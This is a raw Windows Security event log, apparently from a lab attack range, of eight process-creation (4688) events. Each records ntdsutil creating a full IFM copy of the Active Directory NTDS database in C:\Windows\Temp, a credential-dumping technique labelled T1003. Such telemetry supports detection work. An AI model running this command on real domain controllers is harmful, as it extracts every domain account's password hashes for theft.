<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:47:04.788786400Z'/><EventRecordID>31213331</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='816'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0x18bc</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x90c</Data><Data Name='CommandLine'>"C:\Windows\system32\ntdsutil.exe" "ac i ntds" ifm "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:46:58.657885900Z'/><EventRecordID>31213313</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='816'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0x1a84</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0xec0</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:43:19.090057300Z'/><EventRecordID>31205245</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='368'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0xf9c</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x14dc</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:41:57.268855100Z'/><EventRecordID>31198786</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='6548'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0x7c0</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x1604</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:39:49.241330600Z'/><EventRecordID>31197549</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='5884'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0xf84</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x210</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:38:52.835733900Z'/><EventRecordID>31189650</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='5600'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0xe28</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0xf9c</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:38:40.513106600Z'/><EventRecordID>31189583</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='4040'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0x1774</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x6ec</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='2022-08-31T17:34:44.753560200Z'/><EventRecordID>31187574</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='4040'/><Channel>Security</Channel><Computer>win-dc-mhaag-attack-range-602.attackrange.local</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>ATTACKRANGE\Administrator</Data><Data Name='SubjectUserName'>administrator</Data><Data Name='SubjectDomainName'>ATTACKRANGE</Data><Data Name='SubjectLogonId'>0xd08f94</Data><Data Name='NewProcessId'>0x1b30</Data><Data Name='NewProcessName'>C:\Windows\System32\ntdsutil.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0xe20</Data><Data Name='CommandLine'>ntdsutil  "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q</Data><Data Name='TargetUserSid'>NULL SID</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
